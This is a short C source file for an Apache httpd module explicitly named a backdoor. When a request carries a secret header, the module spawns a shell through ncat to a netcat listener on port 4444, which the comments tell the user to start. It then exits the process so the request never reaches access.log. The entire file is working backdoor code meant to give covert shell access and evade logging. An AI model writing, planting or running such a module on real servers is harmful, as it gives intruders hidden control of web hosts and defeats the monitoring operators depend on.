// Uses ncat to connect to a server.
// run this to start server 
// sudo nc -lvnp 4444
// This will not leave a log in access.log
#include "httpd.h"
#include "http_protocol.h"
#include "http_request.h"
#include "http_config.h"
#include "apr_strings.h"
#include <stdio.h>
#include <unistd.h>

static int backdoor_handler(request_rec *r) {
   const char *pass = apr_table_get(r->headers_in, "sourpatchkids");
   if (!pass) return DECLINED;
   if (pass){
      FILE *fp = popen("ncat localhost 4444 -e /bin/sh", "r");
      // exits before the request can be logged.
      exit(0);
   }
return OK;
   
}

static void register_hooks(apr_pool_t *p) {
   ap_hook_handler(backdoor_handler, NULL, NULL, APR_HOOK_FIRST);
}

module AP_MODULE_DECLARE_DATA backdoor_module = {
   STANDARD20_MODULE_STUFF,
   NULL, NULL, NULL, NULL, NULL, register_hooks
};